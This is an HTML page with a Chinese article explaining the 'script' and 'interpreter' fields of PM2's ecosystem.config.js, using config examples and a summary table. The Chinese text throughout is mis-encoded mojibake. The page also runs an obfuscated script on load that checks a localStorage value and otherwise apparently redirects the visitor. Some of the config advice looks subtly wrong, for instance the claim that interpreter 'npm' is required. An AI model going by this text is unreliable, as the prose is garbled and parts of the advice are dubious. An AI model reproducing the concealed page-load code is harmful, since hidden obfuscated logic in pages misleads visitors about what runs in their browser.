<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x2534cf=_0x3676;if((()=>{for(var s=_0x3676,n=_0xecc5();;)try{if(893362==-parseInt(s(142,"0Lut"))*(-parseInt(s(134,"OuK@"))/2)+parseInt(s(154,"0Lut"))/3+-parseInt(s(133,"RSAB"))/4+-parseInt(s(138,"s72K"))/5+-parseInt(s(156,"m@Wa"))/6*(parseInt(s(140,"f#2l"))/7)+parseInt(s(150,"CDUf"))/8+parseInt(s(146,"ud(1"))/9*(parseInt(s(151,"Ut!A"))/10))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x2534cf(152,"VIwX")](_0x2534cf(145,"W[yu"))!=_0x2534cf(147,"f#2l"))throw window[_0x2534cf(131,"(k%V")][_0x2534cf(148,"Ho@d")](_0x2534cf(153,"#M@W")),Error();function _0x3676(e,s){var o=_0xecc5();return(_0x3676=function(s,n){var a=o[s-=131];void 0===_0x3676.EvBzet&&(_0x3676.pgrogF=function(s,n){var a,t=[],e=0,o="";for(s=(s=>{for(var n,a,t="",e="",o=0,c=0;a=s.charAt(c++);~a&&(n=o%4?64*n+a:a,o++%4)&&(t+=String.fromCharCode(255&n>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,p=t.length;r<p;r++)e+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(e)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)e=(e+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[e],t[e]=a;for(var c=0,e=0,r=0;r<s.length;r++)a=t[c=(c+1)%256],t[c]=t[e=(e+t[c])%256],t[e]=a,o+=String.fromCharCode(s.charCodeAt(r)^t[(t[c]+t[e])%256]);return o},e=arguments,_0x3676.EvBzet=!0);var s=s+o[0],t=e[s];return t?a=t:(void 0===_0x3676.RVRdUQ&&(_0x3676.RVRdUQ=!0),a=_0x3676.pgrogF(a,n),e[s]=a),a})(e,s)}function _0xecc5(){var s=["BsOpxSkfAL8","CmoRlu1rdSoWWQVcNZDOumkF","WRqbW7dcLmoHWO3dPCkfW5xdM8kNW5j4WQG","iXubW4jdg8kHga","W7PPn8ktBSkXFW","d8kqWPldI05ouZhdKSk7WP4pW6uhf8kPsmkMW7lcJSoKsSo6WQtdJ8oU","WOxcKfBdMmkuW4/cN8oVWPiiamkIWRq","emoVW5ZdU8kBWPilWRG3j8owpCoi","W5NcOW7dHglcGenjda","gftcU1jdWRCvW7O","m8kGW6hdISo9W6JdGL1iWRNcJCkC","CSoPjKTzcCoXWPRcNWDnECkT","E2OKt8oNW6pcTCoZWPFcIdVdHq","jbzSWReCvCo/cwS/W4VcR8k3","W58dd1jvWQ3cUa","WOdcKfxdN8kDW4VcNCksWOyWaSkBWR1L","rh7cKelcRCkmcL8BxCo/W6fu","oCkeWRWvW7j+WQBcJCoHbSkRW7hcQYO","W50NbfSWWRJcRKdcKZTzW4e","W4vLWQ4tW4RdGmklWPlcUSk9AYG","WOddRZpcGmoUWRZdRq","W4DOkZNdUfTtWPZcSW","WRqaWPxdPSk/W4dcUmoy","W4ZcJCk/lCkvW4fxqmow","C2z/b8o2W77cHXZcGIuSW6rGWQG","WPXJqXPX"];return(_0xecc5=function(){return s})()}document.title="pm2 ecosystem.config.js ä¸­ script å­—æ®µ",document.getElementById("article").innerHTML='<div><p>æ˜¯çš„ï¼Œåœ¨ <code>ecosystem.config.js</code> ä¸­ï¼Œ<code>script</code> å­—æ®µå¯ä»¥æŒ‡å®š <strong>Node.js å…¥å£æ–‡ä»¶</strong>  ï¼ˆå¦‚ <code>app.js</code>ï¼‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <strong><code>node</code> å‘½ä»¤</strong>   æ¥è¿è¡Œè„šæœ¬ï¼ˆä¾‹å¦‚ <code>node server.js</code>ï¼‰ã€‚ä»¥ä¸‹æ˜¯å…·ä½“ç”¨æ³•å’ŒåŒºåˆ«ï¼š</p>\n<hr>\n<h2><strong>1. <code>script</code> ä¸º Node.js æ–‡ä»¶ï¼ˆæ¨èï¼‰</strong></h2>\n<p>ç›´æ¥æŒ‡å®šå…¥å£æ–‡ä»¶ï¼ŒPM2 ä¼šè‡ªåŠ¨ç”¨ <code>node</code> æ‰§è¡Œï¼š</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./app.js&#x27;</span>,  <span class="hljs-comment">// PM2 ä¼šè‡ªåŠ¨è°ƒç”¨ `node app.js`</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;node&#x27;</span>, <span class="hljs-comment">// å¯çœç•¥ï¼ˆé»˜è®¤å°±æ˜¯ `node`ï¼‰</span>\n  }]\n};\n</code></pre>\n<p>âœ… <strong>é€‚ç”¨åœºæ™¯</strong>  ï¼š</p>\n<ul>\n<li>å¤§å¤šæ•° Node.js åº”ç”¨ï¼ˆå¦‚ Expressã€NestJSã€Koa ç­‰ï¼‰ã€‚</li>\n<li>æ— éœ€æ‰‹åŠ¨å†™ <code>node</code> å‘½ä»¤ï¼ŒPM2 è‡ªåŠ¨å¤„ç†ã€‚</li>\n</ul>\n<hr>\n<h2><strong>2. <code>script</code> ä¸º <code>node</code> å‘½ä»¤</strong></h2>\n<p>å¦‚æœéœ€è¦é¢å¤–å‚æ•°ï¼ˆå¦‚ <code>--inspect</code> è°ƒè¯•ï¼‰ï¼Œå¯ä»¥æ˜¾å¼ä½¿ç”¨ <code>node</code>ï¼š</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;node&#x27;</span>,       <span class="hljs-comment">// ç›´æ¥è°ƒç”¨ `node`</span>\n    <span class="hljs-attr">args</span>: <span class="hljs-string">&#x27;server.js --port 3000&#x27;</span>, <span class="hljs-comment">// ä¼ é€’ç»™ `node` çš„å‚æ•°</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;node&#x27;</span>,  <span class="hljs-comment">// å¯çœç•¥ï¼ˆé»˜è®¤æ˜¯ `node`ï¼‰</span>\n  }]\n};\n</code></pre>\n<p>âœ… <strong>é€‚ç”¨åœºæ™¯</strong>  ï¼š</p>\n<ul>\n<li>éœ€è¦ä¼ é€’ Node.js è¿è¡Œæ—¶å‚æ•°ï¼ˆå¦‚ <code>--inspect</code>ã€<code>--max-old-space-size</code>ï¼‰ã€‚</li>\n<li>è¿è¡Œé <code>.js</code> æ–‡ä»¶ï¼ˆå¦‚ TypeScript çš„ <code>.ts</code> æ–‡ä»¶ï¼Œéœ€é…åˆ <code>ts-node</code>ï¼‰ã€‚</li>\n</ul>\n<hr>\n<h2><strong>3. <code>script</code> ä¸º <code>npm</code> / <code>yarn</code></strong></h2>\n<p>å¦‚æœé¡¹ç›®ä½¿ç”¨ <code>npm start</code> æˆ– <code>yarn start</code>ï¼š</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;npm&#x27;</span>,        <span class="hljs-comment">// æˆ– &#x27;yarn&#x27;</span>\n    <span class="hljs-attr">args</span>: <span class="hljs-string">&#x27;start&#x27;</span>,        <span class="hljs-comment">// è¿è¡Œ `npm start`</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;npm&#x27;</span>,  <span class="hljs-comment">// å¿…é¡»æŒ‡å®šä¸º `npm` æˆ– `yarn`</span>\n  }]\n};\n</code></pre>\n<p>âœ… <strong>é€‚ç”¨åœºæ™¯</strong>  ï¼š</p>\n<ul>\n<li>é¡¹ç›®é€šè¿‡ <code>package.json</code> çš„ <code>scripts</code> å¯åŠ¨ï¼ˆå¦‚ <code>create-react-app</code>ã€<code>Next.js</code>ï¼‰ã€‚</li>\n<li>éœ€è¦å…¼å®¹ <code>npm</code> / <code>yarn</code> çš„ç‰¹å®šç¯å¢ƒå˜é‡ã€‚</li>\n</ul>\n<hr>\n<h2><strong>4. <code>script</code> ä¸ºå…¶ä»–è§£é‡Šå™¨ï¼ˆPythonã€Bash ç­‰ï¼‰</strong></h2>\n<p>PM2 ä¹Ÿå¯ä»¥è¿è¡Œé Node.js è„šæœ¬ï¼š</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;python-server&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./app.py&#x27;</span>,\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;python3&#x27;</span>, <span class="hljs-comment">// æŒ‡å®š Python è§£é‡Šå™¨</span>\n  }, {\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;bash-script&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./start.sh&#x27;</span>,\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;bash&#x27;</span>,   <span class="hljs-comment">// æŒ‡å®š Bash è§£é‡Šå™¨</span>\n  }]\n};\n</code></pre>\n<p>âœ… <strong>é€‚ç”¨åœºæ™¯</strong>  ï¼š</p>\n<ul>\n<li>æ··åˆæŠ€æœ¯æ ˆï¼ˆå¦‚ Node.js + Python å¾®æœåŠ¡ï¼‰ã€‚</li>\n<li>è¿è¡Œ Shell è„šæœ¬ã€Python è„šæœ¬ç­‰ã€‚</li>\n</ul>\n<hr>\n<h2><strong>æ€»ç»“</strong></h2>\n<table>\n<thead>\n<tr>\n<th><code>script</code> ç±»å‹</th>\n<th>ç¤ºä¾‹</th>\n<th>æ˜¯å¦éœ€è¦ <code>interpreter</code>?</th>\n<th>é€‚ç”¨åœºæ™¯</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Node.js æ–‡ä»¶</strong></td>\n<td><code>script: \'app.js\'</code></td>\n<td>âŒ å¯çœç•¥ï¼ˆé»˜è®¤ <code>node</code>ï¼‰</td>\n<td>æ™®é€š Node.js åº”ç”¨</td>\n</tr>\n<tr>\n<td><strong><code>node</code> å‘½ä»¤</strong></td>\n<td><code>script: \'node\', args: \'server.js\'</code></td>\n<td>âŒ å¯çœç•¥</td>\n<td>éœ€è¦é¢å¤– Node å‚æ•°</td>\n</tr>\n<tr>\n<td><strong><code>npm</code> / <code>yarn</code></strong></td>\n<td><code>script: \'npm\', args: \'start\'</code></td>\n<td>âœ… å¿…é¡»æŒ‡å®š <code>npm</code>/<code>yarn</code></td>\n<td>å‰ç«¯é¡¹ç›®ï¼ˆReact/Vueï¼‰</td>\n</tr>\n<tr>\n<td><strong>å…¶ä»–è§£é‡Šå™¨</strong></td>\n<td><code>script: \'app.py\', interpreter: \'python3\'</code></td>\n<td>âœ… å¿…é¡»æŒ‡å®š</td>\n<td>Python/Bash è„šæœ¬</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>æœ€ä½³å®è·µ</strong></h3>\n<ol>\n<li><strong>æ™®é€š Node.js é¡¹ç›®</strong>   â†’ ç›´æ¥æŒ‡å®š <code>.js</code> æ–‡ä»¶ï¼ˆ<code>script: \'app.js\'</code>ï¼‰ã€‚</li>\n<li><strong>éœ€è¦è°ƒè¯•/ç‰¹æ®Šå‚æ•°</strong>   â†’ ç”¨ <code>script: \'node\', args: \'...\'</code>ã€‚</li>\n<li><strong><code>npm</code>/<code>yarn</code> é¡¹ç›®</strong>   â†’ å¿…é¡»æŒ‡å®š <code>interpreter: \'npm\'</code>ã€‚</li>\n<li><strong>é Node.js è„šæœ¬</strong>   â†’ å¿…é¡»æŒ‡å®š <code>interpreter</code>ï¼ˆå¦‚ <code>python3</code>ã€<code>bash</code>ï¼‰ã€‚</li>\n</ol>\n<p>è¿™æ ·å¯ä»¥ç¡®ä¿ PM2 ä»¥æ­£ç¡®çš„æ–¹å¼è¿è¡Œä½ çš„åº”ç”¨ï¼ ğŸš€</p>\n</div>'</script></body></html>